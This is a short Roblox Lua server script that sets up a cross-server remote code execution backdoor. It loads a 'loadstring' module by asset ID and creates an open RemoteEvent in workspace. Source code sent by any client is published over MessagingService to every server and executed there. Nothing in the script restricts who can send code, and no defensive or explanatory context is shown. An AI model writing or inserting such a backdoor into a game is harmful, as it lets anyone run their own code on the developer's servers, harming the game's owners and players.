local loadstring = require(14132891321)
local MS = game:GetService("MessagingService")

MS:SubscribeAsync("ss", function(args)
	loadstring:SpawnS(args.Data[1],workspace)
end)

Instance.new("RemoteEvent",workspace).OnServerEvent:Connect(function(_,src)
	MS:PublishAsync("ss", {src})
end)
